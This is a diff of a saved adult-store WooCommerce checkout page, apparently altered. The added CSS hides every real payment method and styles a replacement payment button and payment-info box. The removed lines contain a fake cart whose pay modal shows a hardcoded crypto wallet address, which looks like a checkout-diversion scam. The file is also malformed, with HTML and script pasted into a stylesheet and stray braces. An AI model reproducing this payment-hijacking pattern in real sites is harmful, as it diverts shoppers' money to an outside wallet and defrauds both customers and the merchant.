@@ -1594,42 +1594,43 @@ transition: all 1s ease;
 .woocommerce form.checkout_coupon input.input-text::placeholder {
   color: var(--global-gray-500);
 }
-.woocommerce form.checkout_coupon input.input-text:focus {
-  border: 1px solid var(--global-gray-400);
-  box-shadow: none;
-} */
-.zen-checkout-notices div.woocommerce-info {
-  margin-bottom: 8px;
-  background-color: #ffffff;
-  box-shadow: none;
-  padding: 8px 16px;
-  border-radius: 2px;
+/* 自定义支付按钮 - 替换所有支付方式 */
+#payment ul.wc_payment_methods li.wc_payment_method {
+  display: none !important;
 }
-.zen-checkout-notices div.woocommerce-error {
-  margin-bottom: 8px;
-  background-color: #FFEDF1;
-  box-shadow: none;
-  padding: 8px 16px;
-  border-radius: 2px;
+
+/* 支付按钮样式 */
+.custom-payment-btn {
+  display: block;
+  width: 100%;
+  padding: 16px;
+  background: #d72878;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  text-align: center;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  margin: 20px 0;
 }
-<!-- 购物车 -->
-  <div class="cart-bar">
-  <div>🛒 Shopping Cart</div>
-  <div class="cart-items" id="cartItems">Shopping cart is empty</div>
-  <div>Total: <span id="total">$0</span></div>
-  <div class="cart-count" id="count">0</div>
-  <button id="payBtn" disabled>Pay immediately</button>
-</div>
 
-<div class="modal" id="payModal">
-  <div class="modal-box">
-    <h3>✅ Please complete the payment.</h3>
-    <p>Payment address：</p>
-    <div class="address">TBBFsXpjB8MP38KXhU7D1RijTd8GsKfFyX</div>
-    <button class="close-btn" onclick="closeModal()">关闭</button>
-  </div>
-</div>
+/* 支付信息展示 */
+.payment-info-text {
+  display: none;
+  padding: 16px;
+  background: #f1f7fd;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  text-align: center;
+  font-weight: bold;
+  word-break: break-all;
+}
 
+/* 点击后显示 */
+.payment-info-text.show {
+  display: block;
+}
 }
 .bundle-toggle-btn {
     background-color: #d72878;
@@ -4511,31 +4512,7 @@ shopNowLink.style.marginBottom = "2em";
 }
 });
 </script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9dc12d6bed5404dd',t:'MTc3MzQ2OTI3OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./Romantic Depot _ Adult Sex Toy Superstore_files/saved_resource.html"></iframe><script defer="" src="./Romantic Depot _ Adult Sex Toy Superstore_files/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;2925643cd44c4ff988b6de0660c97f37&quot;,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
-<!-- 购物车样式 -->
-<style>
-.cart-bar {background:#fff; border:1px solid #ddd; padding:15px 20px; border-radius:10px; position:relative; margin:20px 0;}
-.cart-items {margin:12px 0; padding:10px; background:#f1f3f5; border-radius:6px;}
-.cart-item {display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px solid #ddd;}
-.num-btn {width:22px; height:22px; border-radius:50%; border:none; background:#0d6efd; color:white; cursor:pointer;}
-.del-btn {color:red; cursor:pointer; margin-left:5px;}
-.cart-count {position:absolute; top:12px; left:130px; background:red; color:white; width:20px; height:20px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:12px;}
-#payBtn {margin-top:10px; padding:8px 16px; background:#198754; color:white; border:none; border-radius:6px; cursor:pointer;}
-.modal {position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); display:none; justify-content:center; align-items:center;}
-.modal-box {background:white; padding:25px; border-radius:10px; text-align:center;}
-</style>
 
-<!-- 购物车JS -->
-<script>
-let cart = [];
-function addCart(name, price){const idx=cart.findIndex(i=>i.name===name);idx===-1?cart.push({name,price,num:1}):cart[idx].num++;renderCart();}
-function renderCart(){const c=document.getElementById('cartItems'),t=document.getElementById('total'),n=document.getElementById('count'),b=document.getElementById('payBtn');if(cart.length===0){c.innerHTML='购物车为空';t.innerText='$0';n.innerText='0';b.disabled=true;return;}let h='',tot=0,cnt=0;cart.forEach((item,i)=>{tot+=item.price*item.num;cnt+=item.num;h+=`<div class='cart-item'><span>${item.name}</span><span>$${item.price} × ${item.num}</span><div><button class='num-btn' onclick='changeNum(${i},-1)'>-</button><button class='num-btn' onclick='changeNum(${i},1)'>+</button><span class='del-btn' onclick='delItem(${i})'>删除</span></div></div>`;});c.innerHTML=h;t.innerText='$'+tot;n.innerText=cnt;b.disabled=false;}
-function changeNum(i,n){cart[i].num+=n;cart[i].num<=0&&cart.splice(i,1);renderCart();}
-function delItem(i){cart.splice(i,1);renderCart();}
-document.getElementById('payBtn').onclick=()=>document.getElementById('payModal').style.display='flex';
-function closeModal(){document.getElementById('payModal').style.display='none';}
-</script>
-</body>
-</html>
 
 
 
